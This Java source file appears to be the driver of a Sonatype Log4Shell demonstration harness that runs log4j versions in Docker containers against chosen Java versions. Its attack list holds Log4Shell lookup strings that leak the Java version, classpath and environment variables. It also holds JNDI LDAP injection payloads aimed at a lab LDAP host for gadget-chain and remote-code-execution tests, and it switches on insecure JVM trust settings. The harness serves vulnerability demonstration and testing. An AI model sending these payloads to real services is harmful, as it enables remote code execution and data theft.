package com.sonatype.demo.log4shell;

import com.sonatype.demo.log4shelldemo.helpers.DockerEnvironment;
import com.sonatype.demo.log4shelldemo.helpers.ProcessHelper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public class Driver {

    private static final String fatjars ="-jar-with-dependencies.jar";
    public static final String ANYJAR = ".jar";

    private static final Logger log= LoggerFactory.getLogger(FrontEnd.class);

    private String runnerPath;

    private final Map<Integer, LogVersion> logVersions =new TreeMap<>();
    private final Map<Integer, Attack> attacksByID =new HashMap<>();
    private final Map<String, LogVersion> logVersionsByName =new TreeMap<>();
    private final Map<String, JavaVersion> javaVersions =new LinkedHashMap<>();
    private final Map<String, SystemProperty> vmProperties =new HashMap<>();
    private final Map<String,Console> consoles=new HashMap<>();
    private final Set<String> localImages;
    private final Map<Integer,Hint> hints=new HashMap<>();
    private final BlockingQueue<GridTestConfiguration> queue=new LinkedBlockingQueue<>();

    public final ResultsStore rs=new ResultsStore();


    public Driver() throws Exception {

        // add specialist consoles
        Console c=new Console("ldap");
        consoles.put("ldap",c);
        c=new Console("dns");
        consoles.put("dns",c);

        localImages= DockerEnvironment.getLocalDockerImages();

        File config=new File("config");
        log.info(config.getAbsolutePath()+" == "+config.exists());
        loadJarPaths();
        loadJavaLevels(config);
        loadAttacks();
        loadHints(config);
        loadVMProperties();
        launcherRunner();


    }

    private void loadAttacks() {

        addAttack(new Attack("expose java version","${sys:java.version}"));
        addAttack(new Attack("expose java classpath","${sys:java.class.path}"));
        addAttack(new Attack("expose envvar value","${env:MODE}"));
        addAttack(new Attack("expose log4j config","${log4j:configLocation}"));

        addAttack(new Attack("transmit java version","${jndi:ldap://ldap.dev:1389/cn=version}","sent us","sent us ${sys:java.version}"));
        addAttack(new Attack("gadget chain","${jndi:ldap://ldap.dev:1389/cn=gadget}","gadget-chain","cannot be cast"));
        addAttack(new Attack("remote code execution","${jndi:ldap://ldap.dev:1389/cn=rce}","XXX","Reference Class Name:"));
        addAttack(new Attack("hidden attack","${jndi:ldap://ldap.dev:1389/a}","thank you for your data",new String[]{"cannot be cast","Reference Class Name:"}));
    }

    private void addAttack(Attack a) {
        a.id=attacksByID.size()+1;
        a.active=false;
        attacksByID.put(a.id,a);
    }

    private void loadVMProperties() {
        SystemProperty p=new SystemProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        vmProperties.put(p.name,p);
        p.id=vmProperties.size();
        p=new SystemProperty("com.sun.jndi.ldap.object.trustSerialData","true");
        vmProperties.put(p.name,p);
        p.id=vmProperties.size();
    }

    /*
     Start the thread that deals with process requests
     */
    private void launcherRunner() {

        Thread t=new Thread(() -> {
            while(true) {
                try {
                    driveJavaImages(queue.take());
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                if(queue.isEmpty()) {
                    WebSocketHandler.handler.unmute();
                }
            }
        });
        t.start();
    }

    /*
    Takes the request group test and converts into an actual
    docker and java command

     */
    private void driveJavaImages(GridTestConfiguration gdc) {


        try {
            //create a launcher
            DockerProcessRunner r=new DockerProcessRunner(runnerPath);

            // run and collect results keyd by log id
            ResultSet groupResults=r.runLogger(gdc);

            // for each result entry add the results to the results store
            // and update any browsers that consoles have changed

            for(String v:groupResults.logVersionNames()) {
                LogVersion lv = logVersionsByName.get(v);
                for(String premsg:groupResults.getVersionMessages(v)) {
                   TestResult results=groupResults.getResults(v,premsg);
                   results.jv=gdc.getJavaVersion();
                   results.lv=lv;
                   results.setType(ResultTypeChecker.getResponseType(premsg,results.getResults()));
                   Console c = rs.addResults(results);
                    WebSocketHandler.handler.sendUpdate("console-" + c.handle + "-main");
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void loadJavaLevels(File c) throws IOException {

        File config=new File(c,"javalevels.txt");
        List<String> lines=Files.readAllLines(config.toPath());

        for(String s:lines) {
            s=s.trim();
            JavaVersion jv=new JavaVersion(s);
            boolean present=localImages.contains(s);
            if(present) {
                jv.active = false;
                javaVersions.put(jv.version, jv);
                rs.addJavaVersion(jv);
            } else{
                log.warn("Specified Java Image {} is not present in local cache ",s);
            }
        }


    }



    private void loadHints(File c) throws IOException {

        File config=new File(c,"hints.txt");
        List<String> lines=Files.readAllLines(config.toPath());
        for(String s:lines) {
            s=s.trim();
            Hint h=new Hint();
            h.hint=s;
            h.id=hints.size()+1;
            hints.put(h.id,h);
        }
        log.info("loaded {} hints",hints.size());


    }

    public  int drive(String logMsg) {
        List<Attack> attacks=new LinkedList<>();
        Attack a=new Attack("adhoc",logMsg);
        attacks.add(a);
        return drive(attacks);
    }

 public  int drive(List<Attack> attacks) {


        int scheduled=0;

        log.info("drive log4j / jvm combinations");
        List<SystemProperty> props=new LinkedList<>();
        for(SystemProperty sp:vmProperties.values()) {
            if(sp.active) {
                props.add(sp);
            }
        }

        List<LogVersion> active=new LinkedList<>();
        for(LogVersion lv:logVersions.values()) {
            if(lv.active) {
                active.add(lv);
            }
        }


     for (JavaVersion jv : javaVersions.values()) {
         if(jv.active){
             GridTestConfiguration gdc=new GridTestConfiguration(jv,active,props,attacks);
             scheduled+=active.size();
             queue.add(gdc);

         }

     }
        return scheduled;

    }


    private void loadJarPaths() throws IOException {

        File current=new File(System.getProperty("user.dir"));

        log.info("searching for log jars in {}",current.getAbsolutePath());
        File driver=new File(current,"driver");

        File log4jversions=new File(driver,"log4jversions");
        List<Path> candidates = getCandidates(log4jversions, fatjars);
        registerLog4JJars(current,candidates);


        for(File k:driver.listFiles()) {
            log.info("child {}",k.getAbsolutePath()) ;
        }
        File runner=new File(driver,"runner");
        candidates = getCandidates(runner, ANYJAR);
        if(candidates==null || candidates.isEmpty()) {
            throw new RuntimeException("no candidate log packages found - run 'mvn package' first");
        }
        Path r=candidates.get(0);
        log.info("candidate runner path {}",r);
        runnerPath=relLoc(current,r.toFile());
        log.info("runner path {}",runnerPath);

    }

    private String relLoc(File first,File second) {
        String a=first.getAbsolutePath();
        String b=second.getAbsolutePath();
        String rel=b.substring(a.length());
        if(rel.startsWith("/")) rel=rel.substring(1);
        return rel;
    }
    private void registerLog4JJars(File current,List<Path> candidates) {

        for(Path p:candidates) {
            p=p.toAbsolutePath();
            File f=p.toFile();
            String name=f.getName();
            String version=name.substring(0,name.length()- fatjars.length());
            LogVersion lv=new LogVersion(version,relLoc(current,f));
            lv.active=false;
            logVersions.put(lv.getId(),lv);
            logVersionsByName.put(lv.getVersion(),lv);

            log.info("log4j version {} = jar {}",version,lv.getVersion());

        }
    }

    private List<Path> getCandidates(File local,String suffix) throws IOException {
        List<Path> candidates;
        Path path= local.toPath();
        try (Stream<Path> pathStream = Files.find(path,
                Integer.MAX_VALUE,
                (p, basicFileAttributes) ->
                        p.getFileName().toString().toLowerCase().endsWith(suffix))
        ) {
            candidates = pathStream.collect(Collectors.toList());
        }
        return candidates;
    }

    public Set<Integer> getLogVersionIDs() {
        return logVersions.keySet();
    }

    public boolean toggleVersionStatus(int versionID) {

        if(logVersions.containsKey(versionID)) {
            LogVersion lv=logVersions.get(versionID);
            lv.active=!lv.active;
            log.error("version id {} switched to {} ",versionID,lv.active);
            return lv.active;
        } else {
            log.error("version id {} does not exist",versionID);
        }
        return false;
    }

    public boolean toggleJavaVersionStatus(String javaID) {

        if(javaVersions.containsKey(javaID)) {
           JavaVersion jv=javaVersions.get(javaID);
            jv.active=!jv.active;
            log.error("version id {} switched to {} ",javaID,jv.active);
            return jv.active;
        }

        log.error("version id {} does not exist",javaID);

        return false;
    }


    public boolean toggleHintStatus(int hintID) {
        if(hints.containsKey(hintID)) {
            Hint h=hints.get(hintID);
            h.active=!h.active;
            return h.active;
        }
        return false;

    }


    public boolean toggleActionStatus(int id) {
        if(attacksByID.containsKey(id)) {
           Attack a=attacksByID.get(id);
            a.active=!a.active;
            return a.active;
        }
        return false;
    }

    public boolean togglePropertyStatus(String key) {

        if(vmProperties.containsKey(key)) {
          SystemProperty p=vmProperties.get(key);
          p.active=!p.active;
          return p.active;
        }
        return false;
    }

    public void cancel() {

        queue.clear();

    }

    /*
    Grid Test runs all active log / java / hint combos
    The application is not involved;
     */


    public void runGridTest() {

        log.info("run grid test");
        int scheduled=0;

        List<String> msgs=new LinkedList<>();
        for(Hint h:hints.values()) {
            if(h.active) {
                msgs.add(h.hint);

            }
        }

        List<Attack> attacks=new LinkedList<>();
        for(Attack a:attacksByID.values()) {
            if(a.active) {
                attacks.add(a);
            }
        }


        scheduled+=drive(attacks);

       log.info("Scheduled {} grid tests",scheduled);
    }

    public int queueSize() {
        return queue.size();
    }


    public Collection<Console> getSpecialistConsoles() {
        return consoles.values();
    }

    public Console getSpecialistConsole(String consoleID) {
        return consoles.get(consoleID);
    }

    public Collection<LogVersion> getLogVersions() {
       return  logVersions.values();
    }

    public Collection<Hint> getHints() {
        return hints.values();
    }

    public Collection<JavaVersion> getJavaVersions() {
       return  javaVersions.values();
    }

    public JavaVersion getJavaVersion(String consoleID) {
        return javaVersions.get(consoleID);
    }

    public Collection<SystemProperty> getVMProperties() {
        return vmProperties.values();
    }

    public Collection<Attack> getAttacks() {
        return attacksByID.values();
    }

}
